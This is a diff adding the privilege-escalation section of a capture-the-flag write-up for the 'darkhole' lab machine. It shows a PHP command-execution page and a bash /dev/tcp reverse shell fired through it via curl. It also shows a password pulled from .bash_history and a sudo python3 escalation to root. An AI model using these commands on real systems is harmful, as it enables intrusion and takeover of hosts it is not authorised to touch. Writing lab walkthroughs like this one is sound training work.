@@ -221,6 +221,80 @@ jehad@darkhole:/home$ cat losy/user.txt
 cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}
 ```
 
+running linpeas, it shows a cron to start phpserver on `localhost:9999` in `/opt/web/index.php`.
+`* * * * * losy  cd /opt/web && php -S localhost:9999`
+
+
+```bash
+jehad@darkhole:~$ cat /opt/web/index.php 
+<?php
+echo "Parameter GET['cmd']";
+if(isset($_GET['cmd'])){
+echo system($_GET['cmd']);
+}
+
+
+
+?>
+
+```
+
+so open ssh with port forward
+
+`ssh jehad@$IP -L 9999:localhost:9999`
+
+to do a reverse shell:
+
+
+`nc -lvp 1337`
+
+
+`bash -c 'bash -i >& /dev/tcp/192.168.9.4/1337 0>&1'`
+
+```bash
+$ curl localhost:9999/index.php?cmd=id
+Parameter GET['cmd']uid=1002(losy) gid=1002(losy) groups=1002(losy)
+uid=1002(losy) gid=1002(losy) groups=1002(losy)
+
+$ curl localhost:9999/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.9.4%2F1337%200%3E%261%27
+```
+
+on the reverse shell we are losy, the user has a `.bash_history` containing a password.
+
+```bash
+
+$ ls -lah ~/.bash_history
+...
+P0assw0rd losy:gang
+sudo -l
+sudo python3 -c 'import os; os.system("/bin/sh")'
+sudo python -c 'import os; os.system("/bin/sh")'
+sudo /usr/bint/python3 -c 'import os; os.system("/bin/sh")'
+sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
+...
+
+```
+
+losy can execute python as root, so connect via ssh `ssh losy@$IP`.
+
+```bash
+losy@darkhole:~$ sudo -l
+[sudo] password for losy: 
+Matching Defaults entries for losy on darkhole:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User losy may run the following commands on darkhole:
+    (root) /usr/bin/python3
+
+losy@darkhole:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+cyberctfd{tuF9WIjTCUGyKe8JVKGmqSaDuHp4mQqc} 
+
+```
 
 ## Flags
 User: `cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}`
+Root: `cyberctfd{tuF9WIjTCUGyKe8JVKGmqSaDuHp4mQqc}`
